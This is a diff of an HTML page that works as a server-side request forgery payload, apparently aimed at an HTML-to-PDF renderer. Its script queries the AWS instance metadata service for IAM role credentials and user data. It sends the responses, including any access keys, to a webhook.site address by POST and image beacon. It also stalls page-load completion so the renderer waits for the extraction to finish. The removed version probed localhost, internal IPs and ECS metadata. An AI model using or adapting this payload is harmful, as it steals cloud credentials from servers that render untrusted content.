@@ -1,25 +1,180 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Simplified SSRF Testing</title>
+    <title>AWS Metadata Extraction</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 20px;
+            background: #f0f0f0;
+        }
+        .loading-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(255, 255, 255, 0.95);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
+            z-index: 9999;
+        }
+        .spinner {
+            border: 8px solid #f3f3f3;
+            border-top: 8px solid #3498db;
+            border-radius: 50%;
+            width: 80px;
+            height: 80px;
+            animation: spin 1s linear infinite;
+            margin-bottom: 30px;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        .progress-container {
+            width: 400px;
+            height: 30px;
+            background: #ddd;
+            border-radius: 15px;
+            overflow: hidden;
+            margin: 20px 0;
+        }
+        .progress-bar {
+            height: 100%;
+            background: linear-gradient(90deg, #3498db, #2ecc71);
+            width: 0%;
+            transition: width 0.5s ease;
+            border-radius: 15px;
+        }
+        .status-text {
+            font-size: 18px;
+            color: #333;
+            text-align: center;
+            margin: 10px 0;
+        }
+        .main-content {
+            display: none;
+        }
+        .result-box {
+            border: 3px solid #333;
+            margin: 20px 0;
+            padding: 20px;
+            background: white;
+            border-radius: 10px;
+            min-height: 150px;
+        }
+        .credentials-found {
+            background: #ff4444 !important;
+            color: white;
+            border-color: #cc0000 !important;
+            font-weight: bold;
+            text-align: center;
+            font-size: 18px;
+        }
+        .success {
+            background: #44ff44 !important;
+            border-color: #00aa00 !important;
+        }
+        pre {
+            background: #f9f9f9;
+            padding: 15px;
+            border: 1px solid #ddd;
+            border-radius: 5px;
+            white-space: pre-wrap;
+            word-wrap: break-word;
+            font-size: 12px;
+            max-height: 300px;
+            overflow-y: auto;
+        }
+    </style>
 </head>
 <body>
-    <h1>🎯 Simplified SSRF Vector Testing</h1>
-    <div id="status">Testing simpler SSRF approaches...</div>
-    
+    <!-- Loading overlay that prevents page load completion -->
+    <div class="loading-overlay" id="loadingOverlay">
+        <div class="spinner"></div>
+        <div class="status-text" id="loadingStatus">Initializing AWS Metadata Extraction...</div>
+        <div class="progress-container">
+            <div class="progress-bar" id="progressBar"></div>
+        </div>
+        <div class="status-text" id="progressText">0% Complete</div>
+        <div style="margin-top: 20px; font-size: 14px; color: #666;">
+            Please wait - PDF generation will begin after all operations complete
+        </div>
+    </div>
+
+    <!-- Hidden images that keep page in loading state -->
+    <img id="loadingImage1" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" style="display:none;">
+    <img id="loadingImage2" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" style="display:none;">
+    <img id="loadingImage3" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" style="display:none;">
+
+    <!-- Main content -->
+    <div class="main-content" id="mainContent">
+        <h1>🎯 AWS Metadata Extraction Results</h1>
+        
+        <div class="result-box" id="result1">
+            <h2>📋 Test 1: AWS Metadata v1.0 Root</h2>
+            <div id="content1">Loading...</div>
+        </div>
+        
+        <div class="result-box" id="result2">
+            <h2>🔑 Test 2: IAM Security Credentials</h2>
+            <div id="content2">Loading...</div>
+        </div>
+        
+        <div class="result-box" id="result3">
+            <h2>📄 Test 3: AWS User Data</h2>
+            <div id="content3">Loading...</div>
+        </div>
+        
+        <div class="result-box" id="result4">
+            <h2>🕰️ Test 4: Legacy API Test</h2>
+            <div id="content4">Loading...</div>
+        </div>
+        
+        <div class="result-box" id="summary">
+            <h2>📊 EXECUTION SUMMARY</h2>
+            <div id="summaryContent">Analysis in progress...</div>
+        </div>
+    </div>
+
     <script>
         // Replace with your webhook URL
         var WEBHOOK_URL = 'https://webhook.site/your-unique-id';
         
-        function sendResult(testName, url, result, success) {
+        var testsCompleted = 0;
+        var totalTests = 4;
+        var results = [];
+        var loadingImages = [];
+        
+        // Prevent page load completion by creating pending image loads
+        function createPendingImageLoad(id, delayMs) {
+            return new Promise((resolve) => {
+                setTimeout(() => {
+                    var img = document.getElementById(id);
+                    img.onload = resolve;
+                    img.src = 'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNkYPhfDwAChwGA60e6kgAAAABJRU5ErkJggg==';
+                }, delayMs);
+            });
+        }
+        
+        function updateProgress(percentage, statusText) {
+            document.getElementById('progressBar').style.width = percentage + '%';
+            document.getElementById('progressText').textContent = Math.round(percentage) + '% Complete';
+            document.getElementById('loadingStatus').textContent = statusText;
+        }
+        
+        function sendWebhook(testName, url, response, success) {
             var data = {
                 timestamp: new Date().toISOString(),
                 test: testName,
                 target_url: url,
-                result: result,
+                response: response,
                 success: success,
-                result_length: result.length,
-                has_credentials: result.includes('AccessKeyId') || result.includes('SecretAccessKey')
+                response_length: response.length,
+                has_credentials: response.includes('AccessKeyId') || response.includes('SecretAccessKey')
             };
             
             try {
@@ -28,145 +183,185 @@
                 xhr.setRequestHeader('Content-Type', 'application/json');
                 xhr.send(JSON.stringify(data));
                 
-                // Also send as GET backup
+                // Backup GET request
                 var img = new Image();
-                img.src = WEBHOOK_URL + '/img?' + 
+                img.src = WEBHOOK_URL + '/backup?' + 
                     'test=' + encodeURIComponent(testName) + 
                     '&success=' + success +
-                    '&length=' + result.length +
+                    '&length=' + response.length +
                     '&credentials=' + data.has_credentials;
-                
             } catch (e) {
-                console.log('Webhook send failed:', e);
+                console.log('Webhook failed:', e);
             }
         }
         
-        function testEndpoint(url, testName) {
-            document.getElementById('status').innerHTML += '<br>🔄 Testing: ' + testName;
-            
-            try {
-                var xhr = new XMLHttpRequest();
-                xhr.open('GET', url, false);
-                xhr.send();
-                
-                var result = xhr.responseText;
-                var success = result && result.length > 5;
-                
-                document.getElementById('status').innerHTML += '<br>✅ ' + testName + ': ' + result.length + ' bytes';
-                
-                if (result.includes('AccessKeyId')) {
-                    document.getElementById('status').innerHTML += '<br>🚨 CREDENTIALS in ' + testName + '!';
+        function executeTest(testUrl, testName, resultId) {
+            return new Promise((resolve) => {
+                try {
+                    var xhr = new XMLHttpRequest();
+                    xhr.open('GET', testUrl, false);
+                    xhr.send();
+                    
+                    var response = xhr.responseText;
+                    var success = response && response.length > 5;
+                    
+                    // Update UI
+                    var contentEl = document.getElementById(resultId);
+                    var resultEl = document.getElementById(resultId.replace('content', 'result'));
+                    
+                    contentEl.innerHTML = 
+                        '<strong>URL:</strong> ' + testUrl + '<br><br>' +
+                        '<strong>Response (' + response.length + ' bytes):</strong><br>' +
+                        '<pre>' + response + '</pre>';
+                    
+                    if (response.includes('AccessKeyId') || response.includes('SecretAccessKey')) {
+                        resultEl.className += ' credentials-found';
+                        contentEl.innerHTML = '🚨🚨🚨 AWS CREDENTIALS DETECTED! 🚨🚨🚨<br><br>' + contentEl.innerHTML;
+                    } else if (success) {
+                        resultEl.className += ' success';
+                    }
+                    
+                    // Send to webhook
+                    sendWebhook(testName, testUrl, response, success);
+                    
+                    results.push({
+                        testName: testName,
+                        url: testUrl,
+                        response: response,
+                        success: success,
+                        hasCredentials: response.includes('AccessKeyId')
+                    });
+                    
+                    resolve({success: success, response: response});
+                    
+                } catch (e) {
+                    var errorMsg = 'ERROR: ' + e.message;
+                    document.getElementById(resultId).innerHTML = '<strong>Error:</strong> ' + errorMsg;
+                    
+                    sendWebhook(testName + '_ERROR', testUrl, errorMsg, false);
+                    
+                    results.push({
+                        testName: testName,
+                        url: testUrl,
+                        response: errorMsg,
+                        success: false,
+                        hasCredentials: false
+                    });
+                    
+                    resolve({success: false, response: errorMsg});
                 }
-                
-                sendResult(testName, url, result, success);
-                
-            } catch (e) {
-                document.getElementById('status').innerHTML += '<br>❌ ' + testName + ': ' + e.message;
-                sendResult(testName, url, 'ERROR: ' + e.message, false);
-            }
+            });
         }
         
-        // Test 1: Direct AWS metadata (no redirector)
-        setTimeout(() => {
-            testEndpoint(
-                'http://169.254.169.254/latest/meta-data/',
-                'Direct_AWS_Metadata'
-            );
-        }, 2000);
-        
-        // Test 2: Direct AWS v1
-        setTimeout(() => {
-            testEndpoint(
+        async function runAllTests() {
+            updateProgress(10, "Starting AWS metadata extraction...");
+            
+            // Test 1
+            updateProgress(20, "Testing AWS Metadata v1.0...");
+            await executeTest(
                 'http://169.254.169.254/1.0/meta-data/',
-                'Direct_AWS_v1_Metadata'
+                'AWS_Metadata_v1.0',
+                'content1'
             );
-        }, 4000);
-        
-        // Test 3: Direct localhost
-        setTimeout(() => {
-            testEndpoint(
-                'http://localhost/',
-                'Direct_Localhost'
+            
+            // Test 2
+            updateProgress(40, "Testing IAM Security Credentials...");
+            await executeTest(
+                'http://169.254.169.254/1.0/meta-data/iam/security-credentials/S3Role',
+                'IAM_S3Role_Credentials',
+                'content2'
             );
-        }, 6000);
-        
-        // Test 4: Direct 127.0.0.1
-        setTimeout(() => {
-            testEndpoint(
-                'http://127.0.0.1/',
-                'Direct_127_0_0_1'
+            
+            // Test 3
+            updateProgress(60, "Testing AWS User Data...");
+            await executeTest(
+                'http://169.254.169.254/1.0/user-data',
+                'AWS_User_Data',
+                'content3'
             );
-        }, 8000);
-        
-        // Test 5: Simple redirector test
-        setTimeout(() => {
-            testEndpoint(
-                'http://127.0.0.1/redir.php?url=https://www.google.com',
-                'Direct_Redirector_Test'
+            
+            // Test 4
+            updateProgress(80, "Testing Legacy API...");
+            await executeTest(
+                'http://169.254.169.254/2007-01-19/meta-data/iam/security-credentials/S3Role',
+                'Legacy_API_S3Role',
+                'content4'
             );
-        }, 10000);
+            
+            // Generate summary
+            updateProgress(90, "Generating summary...");
+            generateSummary();
+            
+            // Complete loading
+            updateProgress(100, "Operations complete - Preparing PDF...");
+            
+            // Allow page to complete loading after 2 more seconds
+            setTimeout(() => {
+                completePageLoading();
+            }, 2000);
+        }
         
-        // Test 6: httpbin.org direct
-        setTimeout(() => {
-            testEndpoint(
-                'http://httpbin.org/get',
-                'Direct_httpbin_Test'
-            );
-        }, 12000);
+        function generateSummary() {
+            var credentialTests = results.filter(r => r.hasCredentials);
+            var successfulTests = results.filter(r => r.success);
+            
+            var summary = '<h3>🎯 Execution Results</h3>';
+            summary += '<p><strong>Total Tests:</strong> ' + results.length + '</p>';
+            summary += '<p><strong>Successful Responses:</strong> ' + successfulTests.length + '</p>';
+            summary += '<p><strong>Credentials Found:</strong> ' + credentialTests.length + '</p>';
+            
+            if (credentialTests.length > 0) {
+                summary += '<div style="background:#ff0000;color:white;padding:25px;margin:20px 0;border:5px solid #000;text-align:center;font-size:20px;">';
+                summary += '🚨🚨🚨 AWS CREDENTIALS DETECTED! 🚨🚨🚨<br>';
+                summary += 'Found in: ' + credentialTests.map(t => t.testName).join(', ');
+                summary += '</div>';
+            }
+            
+            summary += '<h4>📋 Detailed Results:</h4>';
+            results.forEach((result, index) => {
+                summary += '<p><strong>Test ' + (index + 1) + ' (' + result.testName + '):</strong> ';
+                if (result.hasCredentials) {
+                    summary += '🎉 CREDENTIALS FOUND!';
+                } else if (result.success) {
+                    summary += '✅ ' + result.response.length + ' bytes received';
+                } else {
+                    summary += '❌ Failed';
+                }
+                summary += '</p>';
+            });
+            
+            document.getElementById('summaryContent').innerHTML = summary;
+            
+            // Send final summary to webhook
+            sendWebhook('FINAL_SUMMARY', 'N/A', JSON.stringify({
+                totalTests: results.length,
+                successfulTests: successfulTests.length,
+                credentialsFound: credentialTests.length,
+                results: results
+            }), true);
+        }
         
-        // Test 7: httpbin.org redirect simple
-        setTimeout(() => {
-            testEndpoint(
-                'http://httpbin.org/redirect-to?url=https://www.google.com',
-                'httpbin_Redirect_Simple'
-            );
-        }, 14000);
+        function completePageLoading() {
+            // Hide loading overlay
+            document.getElementById('loadingOverlay').style.display = 'none';
+            document.getElementById('mainContent').style.display = 'block';
+            
+            // Complete the pending image loads to signal page load completion
+            document.getElementById('loadingImage1').src = 'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNkYPhfDwAChwGA60e6kgAAAABJRU5ErkJggg==';
+            document.getElementById('loadingImage2').src = 'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNkYPhfDwAChwGA60e6kgAAAABJRU5ErkJggg==';
+            document.getElementById('loadingImage3').src = 'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNkYPhfDwAChwGA60e6kgAAAABJRU5ErkJggg==';
+            
+            // Signal that we're done
+            document.title = 'AWS Metadata Extraction - COMPLETE';
+        }
         
-        // Test 8: Try the working 127.0.0.1/redir.php directly
-        setTimeout(() => {
-            testEndpoint(
-                'http://127.0.0.1/redir.php?url=http://169.254.169.254/latest/meta-data/',
-                'Direct_Redirector_AWS'
-            );
-        }, 16000);
+        // Wait for DOM, then start tests
+        document.addEventListener('DOMContentLoaded', function() {
+            setTimeout(runAllTests, 1000);
+        });
         
-        // Test 9: Alternative internal IPs
-        setTimeout(() => {
-            testEndpoint(
-                'http://172.31.0.1/',
-                'Internal_IP_172_31'
-            );
-        }, 18000);
-        
-        // Test 10: Alternative metadata service ports
-        setTimeout(() => {
-            testEndpoint(
-                'http://169.254.169.254:80/latest/meta-data/',
-                'AWS_Metadata_Port_80'
-            );
-        }, 20000);
-        
-        // Test 11: ECS metadata
-        setTimeout(() => {
-            testEndpoint(
-                'http://169.254.170.2/v2/metadata',
-                'ECS_Metadata_v2'
-            );
-        }, 22000);
-        
-        // Test 12: Alternative localhost ports
-        setTimeout(() => {
-            testEndpoint(
-                'http://localhost:8080/',
-                'Localhost_Port_8080'
-            );
-        }, 24000);
-        
-        // Send completion notification
-        setTimeout(() => {
-            sendResult('ALL_TESTS_COMPLETE', 'N/A', 'Simplified SSRF testing completed', true);
-            document.getElementById('status').innerHTML += '<br><br>🎉 All tests complete! Check webhook for detailed results.';
-        }, 26000);
+        // Backup: start tests after a delay even if DOM event doesn't fire
+        setTimeout(runAllTests, 3000);
     </script>
 </body>
 </html>
